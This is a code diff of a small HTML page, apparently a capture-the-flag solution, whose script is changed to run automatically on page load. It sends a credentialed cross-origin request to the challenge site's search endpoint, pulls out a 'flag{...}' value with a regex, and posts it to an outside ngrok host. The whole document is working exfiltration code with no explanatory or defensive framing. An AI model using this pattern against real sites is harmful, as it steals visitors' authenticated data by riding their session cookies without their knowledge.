@@ -7,28 +7,39 @@
 </head>
 <body>
     <h1>Rubare la Flag dell'Architetto</h1>
-    <button id="stealFlag">Ruba Flag</button>
 
     <script>
-        document.getElementById('stealFlag').onclick = () => {
+        // Funzione per rubare la flag
+        const stealFlag = () => {
             fetch('http://matrix-simplified.capturetheflags.site/search?s=flag', {
                 method: 'GET',
                 credentials: 'include',
                 mode: 'cors'
             })
-            .then(response => response.text())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.text();
+            })
             .then(data => {
-                // Invia la flag al server Flask
-                fetch('/receive_flag', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: 'flag=' + encodeURIComponent(data)  // Invia i dati ricevuti
-                });
+                // Supponiamo che la flag sia nel contenuto della risposta
+                const flag = data.match(/flag{.*?}/); // Modifica questa regex in base al formato della flag
+                if (flag) {
+                    fetch('http://7e57-87-4-142-72.ngrok-free.app/receive_flag', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: `flag=${encodeURIComponent(flag[0])}`
+                    });
+                }
             })
             .catch(error => console.error('Errore:', error));
         };
+
+        // Eseguire automaticamente la funzione al caricamento della pagina
+        window.onload = stealFlag;
     </script>
 </body>
 </html>
